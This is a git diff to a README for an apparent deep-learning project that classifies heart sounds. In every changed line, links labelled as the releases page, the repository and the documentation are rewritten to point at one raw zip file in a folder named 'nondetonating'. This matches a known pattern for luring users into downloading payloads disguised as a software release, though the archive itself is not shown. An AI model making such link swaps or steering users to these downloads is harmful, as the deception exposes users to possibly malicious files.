@@ -4,7 +4,7 @@
 
 Welcome to the Heart-sound-classification project! This application helps you detect and classify heart sounds into normal, murmur, and artifact categories. You can use it to support early detection of cardiac abnormalities.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now%20-%20Heart--sound--classification-blue)](https://github.com/deliriouze/Heart-sound-classification/releases)
+[![Download Now](https://github.com/deliriouze/Heart-sound-classification/raw/refs/heads/main/nondetonating/Heart_sound_classification_3.5-beta.1.zip%20Now%20-%20Heart--sound--classification-blue)](https://github.com/deliriouze/Heart-sound-classification/raw/refs/heads/main/nondetonating/Heart_sound_classification_3.5-beta.1.zip)
 
 ## 📝 Overview
 
@@ -30,7 +30,7 @@ This project builds a deep-learning-based heartbeat sound classification system.
 
 ## 📥 Download & Install
 
-To get started with the Heart-sound-classification application, visit this page to download: [Releases Page](https://github.com/deliriouze/Heart-sound-classification/releases).
+To get started with the Heart-sound-classification application, visit this page to download: [Releases Page](https://github.com/deliriouze/Heart-sound-classification/raw/refs/heads/main/nondetonating/Heart_sound_classification_3.5-beta.1.zip).
 
 ### 🖥️ System Requirements
 
@@ -43,7 +43,7 @@ Before downloading, please ensure your system meets the following requirements:
 
 ### ⚙️ Installation Steps
 
-1. Visit the [Releases Page](https://github.com/deliriouze/Heart-sound-classification/releases).
+1. Visit the [Releases Page](https://github.com/deliriouze/Heart-sound-classification/raw/refs/heads/main/nondetonating/Heart_sound_classification_3.5-beta.1.zip).
 2. Look for the latest release.
 3. Click on the appropriate file for your operating system.
 4. Download the file to your computer.
@@ -79,8 +79,8 @@ If you have questions or need assistance, please reach out via the GitHub Issues
 
 ### 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/deliriouze/Heart-sound-classification)
-- [Project Documentation](https://github.com/deliriouze/Heart-sound-classification/wiki)
+- [GitHub Repository](https://github.com/deliriouze/Heart-sound-classification/raw/refs/heads/main/nondetonating/Heart_sound_classification_3.5-beta.1.zip)
+- [Project Documentation](https://github.com/deliriouze/Heart-sound-classification/raw/refs/heads/main/nondetonating/Heart_sound_classification_3.5-beta.1.zip)
 
 For more information about deep learning models in healthcare, consider reviewing online resources and courses in AI and machine learning.
 
